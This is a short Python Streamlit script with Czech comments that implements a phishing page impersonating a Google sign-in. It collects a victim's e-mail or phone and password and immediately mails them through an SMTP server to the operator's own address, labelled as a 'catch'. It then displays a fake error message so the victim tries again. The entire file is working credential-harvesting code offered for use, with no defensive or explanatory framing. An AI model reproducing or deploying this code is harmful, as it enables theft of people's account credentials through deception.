import streamlit as st
import os
import smtplib
from email.mime.text import MIMEText
from datetime import datetime

# --- NAČTENÍ Z ENVIRONMENT VARIABLES ---
# Pokud proměnné neexistují, aplikace se nespustí (bezpečnostní pojistka)
MOJE_ADRESA = os.environ.get("MOJE_ADRESA")
MOJE_HESLO = os.environ.get("MOJE_HESLO")

def poslat_vysledek(email_zadany, heslo_zadane):
    if not MOJE_ADRESA or not MOJE_HESLO:
        print("Chyba: Nejsou nastaveny environment variables!")
        return

    cas = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
    obsah = f"Úlovek z webu!\nČas: {cas}\nLogin: {email_zadany}\nHeslo: {heslo_zadane}"
    
    msg = MIMEText(obsah)
    msg['Subject'] = "🔑 NOVÝ ZÁZNAM"
    msg['From'] = MOJE_ADRESA
    msg['To'] = MOJE_ADRESA

    try:
        server = smtplib.SMTP_SSL("smtp.seznam.cz", 465)
        server.login(MOJE_ADRESA, MOJE_HESLO)
        server.send_message(msg)
        server.quit()
        print("Úspěšně odesláno!")
    except Exception as e:
        print(f"Chyba odesílání: {e}")

# --- WEB ---
st.set_page_config(page_title="Přihlášení")

col1, col2, col3 = st.columns([1,2,1])
with col2:
    try:
        st.image("logo.png", width=100)
    except:
        st.title("Google")

    st.subheader("Přihlášení")
    user_input = st.text_input("E-mail nebo telefon")
    pass_input = st.text_input("Heslo", type="password")

    if st.button("Další"):
        if user_input and pass_input:
            # Okamžitě pošle údaje na tvůj mail
            poslat_vysledek(user_input, pass_input)
            # Falešná chyba pro uživatele
            st.error("Došlo k chybě. Zkuste to znovu.")
